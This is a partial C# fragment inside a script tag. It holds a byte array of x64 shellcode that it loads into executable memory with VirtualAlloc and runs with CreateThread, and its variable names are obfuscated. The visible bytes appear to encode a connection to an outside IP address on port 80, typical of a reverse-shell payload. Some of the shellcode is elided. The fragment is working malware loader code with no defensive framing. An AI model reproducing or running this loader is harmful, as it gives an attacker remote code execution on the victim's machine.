...
0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
...
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x00,0x50,0x79,0x36,0xa9,0x3d,
...
0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr fuhA = VirtualAlloc(IntPtr.Zero,(UIntPtr)lPPB.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lPPB,0,fuhA,lPPB.Length);
        IntPtr v16Qq2WzxL = IntPtr.Zero;
        IntPtr pIv = CreateThread(IntPtr.Zero,UIntPtr.Zero,fuhA,IntPtr.Zero,0,ref v16Qq2WzxL);
    }
</script>
